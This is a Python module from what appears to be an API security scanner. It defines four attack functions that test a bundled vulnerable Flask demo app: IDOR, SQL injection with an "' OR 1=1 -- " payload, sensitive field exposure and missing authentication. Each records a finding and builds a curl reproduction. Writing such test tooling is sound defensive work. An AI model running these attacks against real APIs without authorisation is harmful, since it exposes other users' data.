"""The four attack modules.

Each attack is a pure function of (client, profile) that actively exploits a
RUNNING API and returns a Finding whose ``confirmed`` flag is decided by plain
deterministic code -- never by an LLM. Because they are pure and replayable,
the verifier re-runs the very same functions after a patch to prove the fix.

The target profile describes *what* to attack (endpoints, credentials, test
resources) so the attack logic stays generic. DEMO_PROFILE targets the bundled
vulnerable Flask app.
"""

from __future__ import annotations

from typing import Any

import httpx

from engine.findings import Finding, build_curl, truncate

# --------------------------------------------------------------------------
# Target profile for the bundled demo app
# --------------------------------------------------------------------------
DEMO_PROFILE: dict[str, Any] = {
    "users": {
        "alice": {"username": "alice", "password": "alice-pw"},
        "bob": {"username": "bob", "password": "bob-pw"},
        "admin": {"username": "admin", "password": "admin-pw"},
    },
    "idor": {
        # Bob tries to read a resource that belongs to Alice.
        "attacker": "bob",
        "victim": "alice",
        "url_template": "/invoices/{id}",
        "victim_resource_id": 101,
        "owner_field": "owner_id",
    },
    "sqli": {
        # Alice injects into her own invoice search to reach other rows.
        "attacker": "alice",
        "url": "/invoices/search",
        "param": "q",
        "benign_value": "coffee",
        "payload": "' OR 1=1 -- ",
        "owner_field": "owner_id",
    },
    "data_exposure": {
        "attacker": "alice",
        "url": "/me",
        "forbidden_fields": ["password_hash", "token", "reset_token", "ssn"],
    },
    "missing_auth": {
        "url": "/admin/users",
        "method": "GET",
    },
}


# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------
def login(client: httpx.Client, profile: dict, who: str) -> dict[str, Any]:
    """Return {token, user_id} for a seeded user, or raise on failure."""
    creds = profile["users"][who]
    resp = client.post("/login", json=creds)
    resp.raise_for_status()
    return resp.json()


def _auth(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


def _full(client: httpx.Client, path: str) -> str:
    """Absolute URL for a path, so curl reproductions are copy-pasteable."""
    base = str(client.base_url).rstrip("/")
    return base + path if base else path


# --------------------------------------------------------------------------
# Attack modules
# --------------------------------------------------------------------------
def attack_idor(client: httpx.Client, profile: dict) -> Finding:
    """Broken access control: an authenticated attacker requests a victim's
    resource. Confirmed if the resource is returned and it does not belong to
    the attacker."""
    cfg = profile["idor"]
    attacker = login(client, profile, cfg["attacker"])
    resource_id = cfg["victim_resource_id"]
    url = cfg["url_template"].format(id=resource_id)
    headers = _auth(attacker["token"])

    resp = client.get(url, headers=headers)
    body = _json(resp)
    owner = body.get(cfg["owner_field"]) if isinstance(body, dict) else None
    confirmed = resp.status_code == 200 and owner is not None and owner != attacker["user_id"]

    if confirmed:
        detail = (f"{cfg['attacker']} (user_id={attacker['user_id']}) read resource "
                  f"{url} owned by user_id={owner}. Expected 403/404.")
    else:
        detail = (f"{cfg['attacker']} got status {resp.status_code} for {url}; "
                  f"access correctly denied or resource owned by attacker.")

    return Finding(
        vuln_class="idor",
        name="Broken access control (IDOR) on invoice retrieval",
        endpoint=url,
        method="GET",
        severity="high",
        confirmed=confirmed,
        detail=detail,
        request={"method": "GET", "url": url, "headers": headers},
        response={"status": resp.status_code, "body": truncate(resp.text)},
        curl=build_curl("GET", _full(client, url), headers=headers),
    )


def attack_sqli(client: httpx.Client, profile: dict) -> Finding:
    """SQL injection: compare a benign search against an injected one. Confirmed
    if the injection returns rows the attacker should not see, or the DB errors
    out (leaked SQL error)."""
    cfg = profile["sqli"]
    attacker = login(client, profile, cfg["attacker"])
    headers = _auth(attacker["token"])
    owner_field = cfg["owner_field"]

    # Baseline: a legitimate search returns only the attacker's own rows.
    benign = client.get(cfg["url"], params={cfg["param"]: cfg["benign_value"]}, headers=headers)

    # Injection attempt.
    inj = client.get(cfg["url"], params={cfg["param"]: cfg["payload"]}, headers=headers)
    body = _json(inj)

    leaked_error = inj.status_code >= 500 and "sql" in inj.text.lower()
    foreign_rows = False
    if isinstance(body, list):
        foreign_rows = any(
            isinstance(r, dict) and r.get(owner_field) not in (None, attacker["user_id"])
            for r in body
        )
    confirmed = leaked_error or foreign_rows

    if foreign_rows:
        detail = (f"Payload {cfg['payload']!r} returned rows owned by other users "
                  f"(baseline returned {_count(benign)} row(s), injection returned "
                  f"{_count(inj)}).")
    elif leaked_error:
        detail = f"Payload {cfg['payload']!r} triggered a database error (leaked SQL)."
    else:
        detail = f"Payload {cfg['payload']!r} returned no extra data; query appears parameterized."

    return Finding(
        vuln_class="sqli",
        name="SQL injection in invoice search",
        endpoint=cfg["url"],
        method="GET",
        severity="high",
        confirmed=confirmed,
        detail=detail,
        request={"method": "GET", "url": cfg["url"],
                 "params": {cfg["param"]: cfg["payload"]}, "headers": headers},
        response={"status": inj.status_code, "body": truncate(inj.text)},
        curl=build_curl("GET", _full(client, cfg["url"]), headers=headers,
                        params={cfg["param"]: cfg["payload"]}),
    )


def attack_data_exposure(client: httpx.Client, profile: dict) -> Finding:
    """Sensitive data exposure: inspect a response for fields that should never
    be returned. Confirmed if any forbidden field is present."""
    cfg = profile["data_exposure"]
    attacker = login(client, profile, cfg["attacker"])
    headers = _auth(attacker["token"])

    resp = client.get(cfg["url"], headers=headers)
    body = _json(resp)
    present = []
    if isinstance(body, dict):
        present = [f for f in cfg["forbidden_fields"] if f in body]
    confirmed = resp.status_code == 200 and bool(present)

    detail = (f"Response exposed forbidden field(s): {', '.join(present)}."
              if confirmed else "No forbidden fields present in response.")

    return Finding(
        vuln_class="data_exposure",
        name="Sensitive data exposure in user profile",
        endpoint=cfg["url"],
        method="GET",
        severity="high",
        confirmed=confirmed,
        detail=detail,
        request={"method": "GET", "url": cfg["url"], "headers": headers},
        response={"status": resp.status_code, "body": truncate(resp.text)},
        curl=build_curl("GET", _full(client, cfg["url"]), headers=headers),
    )


def attack_missing_auth(client: httpx.Client, profile: dict) -> Finding:
    """Missing authentication: call a protected endpoint with no token.
    Confirmed if data is returned (2xx) instead of 401/403."""
    cfg = profile["missing_auth"]
    method = cfg.get("method", "GET")

    resp = client.request(method, cfg["url"])  # deliberately no Authorization header
    confirmed = 200 <= resp.status_code < 300

    detail = (f"Endpoint returned status {resp.status_code} with no credentials; "
              f"expected 401/403.") if confirmed else (
              f"Endpoint correctly rejected unauthenticated request "
              f"(status {resp.status_code}).")

    return Finding(
        vuln_class="missing_auth",
        name="Missing authentication on admin user listing",
        endpoint=cfg["url"],
        method=method,
        severity="high",
        confirmed=confirmed,
        detail=detail,
        request={"method": method, "url": cfg["url"], "headers": {}},
        response={"status": resp.status_code, "body": truncate(resp.text)},
        curl=build_curl(method, _full(client, cfg["url"])),
    )


ATTACKS = {
    "idor": attack_idor,
    "sqli": attack_sqli,
    "data_exposure": attack_data_exposure,
    "missing_auth": attack_missing_auth,
}


def run_all_attacks(client: httpx.Client, profile: dict | None = None) -> list[Finding]:
    """Run every attack module and return the findings in a stable order."""
    profile = profile or DEMO_PROFILE
    return [ATTACKS[name](client, profile) for name in ATTACKS]


# --------------------------------------------------------------------------
# Small response helpers
# --------------------------------------------------------------------------
def _json(resp: httpx.Response) -> Any:
    try:
        return resp.json()
    except Exception:
        return None


def _count(resp: httpx.Response) -> int:
    body = _json(resp)
    return len(body) if isinstance(body, list) else 0
